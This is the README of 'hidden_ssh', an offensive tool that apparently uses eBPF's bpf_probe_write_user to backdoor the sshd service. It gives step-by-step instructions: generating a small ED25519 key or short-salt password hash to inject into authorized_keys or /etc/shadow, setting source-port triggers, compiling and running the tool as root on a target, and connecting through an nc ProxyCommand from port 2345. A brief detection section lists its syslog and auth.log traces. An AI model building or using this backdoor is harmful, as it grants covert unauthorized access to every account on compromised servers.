# hidden_ssh

`hidden_ssh` will **backdoor the `sshd` service** to allow you to connect to a user without knowing their password. It will either inject a public key into the `~/.ssh/authorized_keys` file or modify `/etc/passwd` & `/etc/shadow` while giving root permissions to every user at backdoor trigger.

## Features

To connect to a backdoored server, you'll need to trigger it by connecting to the ssh server on a **specific source port**. The backdoor will then be activated and you'll be able to connect to the targetted user without knowing their password.

### Public Key

> [!IMPORTANT]
> This will only work if the targetted user has a `~/.ssh/authorized_keys` file and contains a larger key than the one we are injecting.

- [x] Inject a public key into the `authorized_keys` of every user

### Password

- [x] Modify `/etc/shadow` to modify every user's password at trigger time

## Configuring the backdoor

Both public key and password backdoors can be configured in the `hidden_ssh.c` file.

### Public Key

> [!TIP]
> As we are trying to overwrite what's the `sshd` is reading. We cannot send back more characters than it read. So, the smaller the injected key is, the better it will fit in the `authorized_keys` file of targetted users.

You can use the `ED25519` algorithm to generate a smaller key.
```bash
$ ssh-keygen -t ed25519 -f backdoor_key
```

Then take the content of the `.pub` file and paste it in the `hidden_ssh.c` file (in the `backdoor_publickey` variable).

```c
char backdoor_publickey[] = "ssh-..."; // Your public key here
```

### Password

> [!TIP]
> Same as the public key, the smaller the hashed password is, the better it will fit in the `/etc/shadow` file.

We can use the `openssl` command to generate a hashed password.
```bash
# By using a small salt, we can generate a smaller hashed password
$ openssl passwd -6 -salt a <password>
```

Then take the hashed password and paste it in the `hidden_ssh.c` file (in the `backdoor_hashed_passwd` variable).

```c
char backdoor_hashed_passwd[] = "$6$a$..."; // Your hashed password here
```

### Trigger ports

You can also configure the source port that will trigger the backdoor in the `hidden_ssh.c` file. (Don't forget to also edit the client script if you change the source port)

```c
// Lines 188-189
set_port(2345, AUTH_BACKDOOR);   // backdoor auth
set_port(2346, PASSWD_BACKDOOR); // backdoor passwd
```

## Server Installation

Compile the program with the following command:

```bash
$ make
```

After compiling the program, run it as root on the server you want to backdoor:

```bash
$ ./hidden_ssh
```

**At this stage, the server is now backdoored ! 🎉**

> [!IMPORTANT]
> It's necessary for the targetted user to have a `~/.ssh/authorized_keys` file and contain a larger key than the one we are injecting. Otherwise, the injection will fail.

## Client usage

### Using the provided client

An helper script is provided to connect to the backdoored server, you can use it with the following command:

```bash
$ ./client/run.sh user target dst_port <key/passwd>
```

### Using the `ssh` command

Or alternatively you can use the following command to connect to the backdoored server:

```bash
$ ssh -o 'ProxyCommand nc -p 2345 %h %p' user@target -i private_key # 2345 being the source port
```

## Known Issues

- Sometimes it happens that the `sshd` service will ignore reading the newly `/etc/shadow` file. So the backdoor won't work as expected. We can just **re-trigger the backdoor** to make it try to read the file again.

- When using the `nc` command it's possible that when logging out, the backdoor port will be locked for a few moments on your netstack. This is due to the `TIME_WAIT` state of the TCP connection on client end. You can just wait a few moments before re-triggering the backdoor as it's **not affecting the backdoor** itself.

## Detection

- As we are using `bpf_probe_write_user`, a message will be logged in the syslogs:
```bash
[...] hidden_ssh[....] is installing a program with bpf_probe_write_user helper that may corrupt user memory!
```

- When logging in, the `sshd` service will still log the connection in the `auth.log` file. (It's probably possible to also block this log, but it's not implemented yet)

> [!NOTE]
> Btw, i know that for now the code ain't clean 💀. Looking to improve it one day.